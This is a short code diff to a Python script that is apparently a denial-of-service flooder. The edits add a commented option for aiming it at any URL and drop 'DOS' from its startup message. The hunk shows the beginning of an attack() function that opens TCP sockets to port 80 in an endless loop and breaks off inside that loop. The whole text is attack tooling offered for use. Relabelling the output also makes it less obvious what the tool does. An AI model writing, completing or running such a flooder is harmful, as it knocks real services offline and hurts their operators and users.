@@ -1,14 +1,17 @@
+#@author Shreeniket Bendre
+
 import socket
 import threading
 import random
 import sys, errno
 
-
+#Comment first target def for custom url, comment second for local host
 target = socket.gethostbyname(socket.gethostname()) 
+#target = "<URL HERE>"
 ip = 'localhost' #change to mask id 
 port = 80
 print("http://151.30.04.1/")
-print("DOS Started Successfully")
+print("Started Successfully")
 def attack():
   while 0<1:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
